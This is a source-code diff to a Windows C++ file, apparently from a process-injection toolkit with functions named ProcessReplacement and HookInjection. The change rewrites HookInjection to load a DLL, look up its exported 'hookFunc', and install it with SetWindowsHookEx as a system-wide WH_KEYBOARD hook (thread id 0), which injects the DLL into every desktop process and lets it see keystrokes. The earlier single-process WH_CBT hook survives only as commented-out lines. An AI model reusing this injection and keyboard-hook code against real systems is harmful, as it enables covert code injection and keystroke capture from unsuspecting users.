@@ -545,6 +545,7 @@ BOOL ProcessReplacement(TCHAR* target, wstring inj_exe)
 	return TRUE;
 }
 
+
 BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
 {
 	// https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx
@@ -556,12 +557,17 @@ BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
 	auto hdll = LoadLibrary(dll_name);
 	DbgPrint("[+] loaded dll\n");
 
-	typedef LRESULT(WINAPI * MyProc)(int code, WPARAM wp, LPARAM lp); // export from calc_dll.dll
+	HOOKPROC addr = (HOOKPROC)GetProcAddress(hdll, "hookFunc");
+	if (addr == NULL) {
+		DbgPrint("The function was not found");
+		return FALSE;
+	}
+	//typedef LRESULT(WINAPI * MyProc)(int code, WPARAM wp, LPARAM lp); // export from calc_dll.dll
 
-	auto mp = MyProc(GetProcAddress(hdll, "MyProc"));
+	//auto mp = MyProc(GetProcAddress(hdll, "MyProc"));
+	//
 	//auto mp = MyProc(GetProcAddress(hdll, "StartW"));
-
-
+	
 	auto pStartupInfo = new STARTUPINFO();
 	auto pProcessInfo = new PROCESS_INFORMATION();
 	DbgPrint("[ ] creating process to hook");
@@ -582,12 +588,15 @@ BOOL HookInjection(TCHAR target[], TCHAR *dll_name)
 		return FALSE;
 	}
 	DbgPrint("[+] Created hook process\n");
-	
 	DbgPrint("[ ] creating process hook");
-	auto hProc = SetWindowsHookEx(WH_CBT,	// Installs a hook procedure that receives notifications useful to a CBT application
-		mp,									// my proc symbol taken from the dll
+	auto hProc = SetWindowsHookEx(WH_KEYBOARD,	// Installs a hook procedure that receives notifications useful to a CBT application
+		addr,									// my proc symbol taken from the dll
 		hdll,								// dll containing my proc
-		pProcessInfo->dwThreadId);			// dword to the thread (something something windows store) RTFM
+		0);			// dword to the thread (something something windows store) RTFM
+	//auto hProc = SetWindowsHookEx(WH_CBT,	// Installs a hook procedure that receives notifications useful to a CBT application
+	//	mp,									// my proc symbol taken from the dll
+	//	hdll,								// dll containing my proc
+	//	pProcessInfo->dwThreadId);			// dword to the thread (something something windows store) RTFM
 	if (!hProc)
 	{
 		DbgPrint("[-] failed to hook process");
